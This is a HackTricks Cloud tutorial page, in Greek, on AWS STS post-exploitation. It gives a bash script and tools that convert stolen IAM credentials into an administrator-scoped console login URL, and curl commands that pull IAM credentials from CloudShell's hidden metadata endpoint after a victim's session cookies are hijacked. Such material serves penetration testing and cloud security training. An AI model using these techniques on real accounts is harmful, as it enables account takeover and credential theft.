# AWS - STS Post Exploitation

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## STS

Για περισσότερες πληροφορίες:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### Από IAM Creds σε Console

Εάν έχετε καταφέρει να αποκτήσετε κάποια IAM credentials, μπορεί να σας ενδιαφέρει να **αποκτήσετε πρόσβαση στην web console** χρησιμοποιώντας τα παρακάτω εργαλεία.\
Σημειώστε ότι ο χρήστης/ρόλος πρέπει να έχει την άδεια **`sts:GetFederationToken`**.

#### Custom script

Το παρακάτω script θα χρησιμοποιήσει το προεπιλεγμένο προφίλ και μια προεπιλεγμένη τοποθεσία AWS (όχι gov και όχι cn) για να σας δώσει ένα υπογεγραμμένο URL που μπορείτε να χρησιμοποιήσετε για να συνδεθείτε στην web console:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

Μπορείτε να **δημιουργήσετε έναν σύνδεσμο web κονσόλας** με [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Βεβαιωθείτε ότι ο χρήστης IAM έχει την άδεια `sts:GetFederationToken`, ή παρέχετε έναν ρόλο για ανάληψη.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) είναι ένα εργαλείο για την ασφαλή αποθήκευση και πρόσβαση σε AWS credentials σε ένα περιβάλλον ανάπτυξης.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
You can also use **aws-vault** to obtain an **browser console session**
{% endhint %}

#### Από Console σε IAM Creds

[**Αρχικά ανακαλύφθηκε σε αυτήν την ανάρτηση**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), Εάν καταφέρετε να παραβιάσετε κάποια πρόσβαση σε μια web console (ίσως κλέψατε cookies και δεν μπορούσατε να αποκτήσετε πρόσβαση στον φάκελο .aws), μπορείτε να αποκτήσετε κάποια IAM token credentials για αυτόν τον χρήστη μέσω **CloudShell**.

Το CloudShell εκθέτει IAM credentials μέσω ενός **μη τεκμηριωμένου endpoint στην θύρα 1338**. Αφού φορτώσετε τα session cookies από το θύμα στον περιηγητή σας, μπορείτε να πλοηγηθείτε στο CloudShell και να εκτελέσετε τις ακόλουθες εντολές για να λάβετε IAM credentials.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
